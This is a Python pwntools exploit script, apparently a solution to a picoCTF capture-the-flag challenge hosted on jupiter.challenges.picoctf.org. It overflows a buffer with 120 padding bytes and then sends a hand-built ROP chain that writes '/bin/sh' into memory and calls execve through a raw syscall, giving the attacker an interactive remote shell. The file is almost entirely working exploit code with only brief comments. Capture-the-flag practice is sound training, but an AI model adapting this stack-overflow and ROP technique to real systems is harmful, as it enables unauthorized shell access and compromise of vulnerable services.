from pwn import * 

def main():

	host = "jupiter.challenges.picoctf.org"
	port = 51462
	offset = 120

	#write /bin/sh in a register
	bin_sh = b'/bin/sh\x00'
	rop_chain =  p64(0x00000000004163f4)   #pop rax, ret
	rop_chain += bin_sh

	#write the memory address where to save /bin/sh
	memory_addr = 0x00000000006bc3a0
	rop_chain += p64(0x0000000000410ca3) #pop rsi, ret
	rop_chain += p64(memory_addr)

	#write /bin/sh to a memory address 
	rop_chain += p64(0x000000000047ff91) #mov [rsi], rax, ret

	#==============================================
	#ROP chain for calling execve('/bin/sh', 0, 0)
	#xor rsi, rsi
	rop_chain += p64(0x0000000000410ca3)
	rop_chain += p64(0x0)

	#xor rdx, rdx
	rop_chain += p64(0x000000000044a6b5)
	rop_chain += p64(0x0)

	# mov 0x3b to rax 
	rop_chain += p64(0x00000000004163f4)
	rop_chain += p64(0x3b)


	#mov rdi the address of /bin/sh 
	rop_chain += p64(0x0000000000400696)
	rop_chain += p64(memory_addr)

	#syscall 
	rop_chain += p64(0x000000000040137c)

	payload = b'84\n'
	payload += b'A' * 120 
	payload += rop_chain 

	p = remote(host, port)

	p.recv()
	p.sendline(payload)
	p.interactive()
	
if __name__ == "__main__":

	main()

